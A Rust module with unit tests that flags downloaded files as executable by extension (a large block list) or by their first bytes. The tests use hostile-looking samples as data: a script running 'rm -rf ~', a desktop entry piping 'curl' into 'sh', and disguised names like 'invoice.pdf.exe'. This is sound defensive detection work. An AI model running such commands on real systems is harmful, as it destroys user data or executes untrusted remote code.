//! Tells files that a system would run from files it would show. Opening a file from a server
//! with the system's default program must never start it, so a file of a type that runs is
//! only ever handed to an editor, and only once the user has said so.

use std::io::Read;
use std::path::Path;

/// Extensions a system runs, installs, mounts or follows when asked to open the file, or
/// opens in a program that runs what the file holds. Gathered from the types Windows and
/// Outlook block as attachments and the ones freedesktop.org lists as programs and installers.
const EXECUTABLE_EXTENSIONS: &[&str] = &[
    // Windows programs, installers and what the shell starts like one.
    "exe",
    "com",
    "scr",
    "pif",
    "cpl",
    "msi",
    "msp",
    "mst",
    "msu",
    "msc",
    "msix",
    "msixbundle",
    "appx",
    "appxbundle",
    "appinstaller",
    "application",
    "appref-ms",
    "xbap",
    "gadget",
    "ppkg",
    "vsix",
    "dll",
    "sys",
    "ocx",
    "drv",
    "xll",
    "wll",
    "diagcab",
    "diagcfg",
    "diagpkg",
    "printerexport",
    "webpnp",
    "wsb",
    // Scripts Windows runs.
    "bat",
    "cmd",
    "ps1",
    "ps1xml",
    "ps2",
    "ps2xml",
    "psc1",
    "psc2",
    "psm1",
    "psd1",
    "psdm1",
    "msh",
    "msh1",
    "msh2",
    "mshxml",
    "msh1xml",
    "msh2xml",
    "vb",
    "vbs",
    "vbe",
    "vbp",
    "js",
    "jse",
    "ws",
    "wsf",
    "wsc",
    "wsh",
    "hta",
    "htc",
    "reg",
    "inf",
    "ins",
    "isp",
    "sct",
    "shb",
    "shs",
    "bgi",
    "ahk",
    "au3",
    "fxp",
    "prg",
    "pcd",
    "vsmacros",
    "vsw",
    // Help files, which run the script they hold.
    "chm",
    "hlp",
    "hpj",
    "cnt",
    "its",
    // Shortcuts, connections and settings that lead somewhere else or change the system.
    "lnk",
    "url",
    "scf",
    "library-ms",
    "search-ms",
    "searchconnector-ms",
    "settingcontent-ms",
    "appcontent-ms",
    "website",
    "desktop",
    "kdelnk",
    "webloc",
    "inetloc",
    "rdp",
    "ica",
    "xnk",
    "theme",
    "themepack",
    "deskthemepack",
    "mcf",
    "ops",
    "osd",
    "prf",
    "grp",
    "plg",
    // Access databases and their shortcuts, which run their macros as they open.
    "ade",
    "adp",
    "mad",
    "maf",
    "mag",
    "mam",
    "maq",
    "mar",
    "mas",
    "mat",
    "mau",
    "mav",
    "maw",
    "mda",
    "mdb",
    "mde",
    "mdt",
    "mdw",
    "mdz",
    "accda",
    "accdb",
    "accde",
    "accdr",
    // Office documents and add-ins that hold macros.
    "docm",
    "dotm",
    "xlsm",
    "xltm",
    "xlsb",
    "xlam",
    "xla",
    "xlm",
    "pptm",
    "potm",
    "ppsm",
    "ppam",
    "ppa",
    "sldm",
    // Disk images the system mounts, whose files then open without a mark of the web.
    "iso",
    "img",
    "vhd",
    "vhdx",
    "dmg",
    // Unix shells, scripts and programs.
    "sh",
    "bash",
    "zsh",
    "csh",
    "tcsh",
    "ksh",
    "fish",
    "shar",
    "run",
    "bin",
    "out",
    "elf",
    "appimage",
    "command",
    "tool",
    "app",
    "action",
    "workflow",
    "terminal",
    "scpt",
    "scptd",
    "applescript",
    // Packages an installer opens.
    "deb",
    "udeb",
    "rpm",
    "flatpak",
    "flatpakref",
    "flatpakrepo",
    "snap",
    "pkg",
    "mpkg",
    // Programs other runtimes start.
    "jar",
    "jnlp",
    "py",
    "pyw",
    "pyc",
    "pyo",
    "pyz",
    "pyzw",
    "pl",
    "rb",
    "rbw",
    "php",
    "tcl",
];

/// How much of a file is read to see whether it is a program.
const CONTENT_PROBE_BYTES: usize = 512;

/// Whether a file called `name` is of a type a system runs rather than shows. Decided by its
/// last extension in any case, after the trailing dots and spaces Windows ignores.
pub fn is_executable_name(name: &str) -> bool {
    let name = name.trim_end_matches(['.', ' ']);
    let Some((stem, extension)) = name.rsplit_once('.') else {
        return false;
    };
    if stem.is_empty() {
        return false;
    }
    let extension = extension.to_lowercase();
    EXECUTABLE_EXTENSIONS.contains(&extension.as_str())
}

/// A desktop entry is known by this anywhere in its first bytes, as shared-mime-info sniffs it.
const DESKTOP_ENTRY: &[u8] = b"[Desktop Entry]";
/// The last offset shared-mime-info looks for a desktop entry's group at.
const DESKTOP_ENTRY_LAST_OFFSET: usize = 32;

/// Whether a file's first bytes are those of a program or a script whatever it is called: a
/// script's `#!` line, a Windows, Linux or macOS program, or a desktop entry.
pub fn is_executable_content(start: &[u8]) -> bool {
    const PROGRAM_MARKS: [&[u8]; 7] = [
        b"#!",
        b"MZ",
        b"\x7fELF",
        b"\xfe\xed\xfa\xce",
        b"\xfe\xed\xfa\xcf",
        b"\xce\xfa\xed\xfe",
        b"\xcf\xfa\xed\xfe",
    ];
    let start = start.strip_prefix(b"\xef\xbb\xbf").unwrap_or(start);
    if PROGRAM_MARKS.iter().any(|mark| start.starts_with(mark)) {
        return true;
    }
    let desktop_entry = start
        .windows(DESKTOP_ENTRY.len())
        .take(DESKTOP_ENTRY_LAST_OFFSET + 1)
        .any(|window| window == DESKTOP_ENTRY);
    let text = start.trim_ascii_start();
    desktop_entry || text.starts_with(DESKTOP_ENTRY) || text.starts_with(b"[InternetShortcut]")
}

/// Whether the file at `path` is a program by its content. A file that cannot be read is not
/// taken for one: nothing can run it either.
pub fn has_executable_content(path: &Path) -> bool {
    let mut start = Vec::with_capacity(CONTENT_PROBE_BYTES);
    let read = std::fs::File::open(path).and_then(|file| {
        file.take(CONTENT_PROBE_BYTES as u64)
            .read_to_end(&mut start)
    });
    read.is_ok() && is_executable_content(&start)
}

#[cfg(test)]
mod tests {
    use super::*;

    #[test]
    fn programs_scripts_and_shortcuts_are_executable_by_name() {
        for name in [
            "setup.exe",
            "SETUP.EXE",
            "run.bat",
            "build.cmd",
            "deploy.ps1",
            "install.sh",
            "app.desktop",
            "Documents.lnk",
            "tool.jar",
            "product.msi",
            "page.hta",
            "macro.vbs",
            "script.py",
            "Program.AppImage",
            "link.url",
            "invoice.pdf.exe",
            "trailing.exe.",
            "trailing.cmd  ",
            "photo.jpg .scr",
        ] {
            assert!(is_executable_name(name), "{name}");
        }
    }

    #[test]
    fn help_files_images_packages_macros_and_scripts_for_other_runtimes_are_executable() {
        for name in [
            "manual.chm",
            "fix.diagcab",
            "update.msu",
            "addin.xll",
            "session.rdp",
            "tool.pyz",
            "module.pyc",
            "window.pyw",
            "macro.ahk",
            "image.iso",
            "disk.img",
            "machine.vhd",
            "machine.vhdx",
            "report.pl",
            "task.rb",
            "index.php",
            "gui.tcl",
            "package.deb",
            "package.rpm",
            "app.flatpakref",
            "repo.flatpakrepo",
            "Tool.AppImage",
            "letter.docm",
            "budget.xlsm",
            "slides.pptm",
            "template.dotm",
            "sheet.xltm",
            "workbook.xlsb",
            "shortcut.kdelnk",
            "company.theme",
            "sandbox.wsb",
            "database.accde",
            "installer.pkg",
            "volume.dmg",
        ] {
            assert!(is_executable_name(name), "{name}");
        }
    }

    #[test]
    fn documents_are_not_executable_by_name() {
        for name in [
            "report.xlsx",
            "notes.txt",
            "photo.psd",
            "server.log",
            "archive.tar.gz",
            "exe",
            "sh",
            ".sh",
            ".bashrc",
            "Makefile",
            "exe.txt",
            "setup.exe.txt",
            "data.json",
            "letter.docx",
            "budget.xlsx",
            "slides.pptx",
            "page.html",
            "style.css",
            "photo.png",
            "notes.md",
            "",
            "...",
        ] {
            assert!(!is_executable_name(name), "{name}");
        }
    }

    #[test]
    fn programs_are_known_by_their_first_bytes() {
        assert!(is_executable_content(b"#!/bin/sh\nrm -rf ~\n"));
        assert!(is_executable_content(
            b"\xef\xbb\xbf#!/usr/bin/env python3\n"
        ));
        assert!(is_executable_content(b"MZ\x90\x00\x03"));
        assert!(is_executable_content(b"\x7fELF\x02\x01\x01"));
        assert!(is_executable_content(b"\xcf\xfa\xed\xfe\x07\x00"));
        assert!(is_executable_content(
            b"\n  [Desktop Entry]\nExec=sh -c 'curl x | sh'\n"
        ));
        assert!(is_executable_content(
            b"[InternetShortcut]\r\nURL=file:///c:/x.exe"
        ));
        // shared-mime-info finds a desktop entry anywhere in its first bytes, after a comment.
        assert!(is_executable_content(b"#x\n[Desktop Entry]\nExec=sh\n"));
        let late = [b"#".repeat(32), b"[Desktop Entry]".to_vec()].concat();
        assert!(is_executable_content(&late));

        assert!(!is_executable_content(b""));
        let too_late = [b"#".repeat(33), b"[Desktop Entry]".to_vec()].concat();
        assert!(!is_executable_content(&too_late));
        assert!(!is_executable_content(b"# a comment, not a shebang\n"));
        assert!(!is_executable_content(b"Monthly report\n"));
        assert!(!is_executable_content(b"PK\x03\x04"));
        assert!(!is_executable_content(b"%PDF-1.7"));
        assert!(!is_executable_content(b"[Settings]\nname=value\n"));
    }

    #[test]
    fn a_script_without_a_telling_name_is_found_by_reading_it() {
        let folder = tempfile::tempdir().unwrap();
        let script = folder.path().join("notes.txt");
        std::fs::write(&script, "#!/bin/sh\necho hi\n").unwrap();
        let text = folder.path().join("readme.txt");
        std::fs::write(&text, "plain words\n").unwrap();
        assert!(has_executable_content(&script));
        assert!(!has_executable_content(&text));
        assert!(!has_executable_content(&folder.path().join("missing")));
    }
}
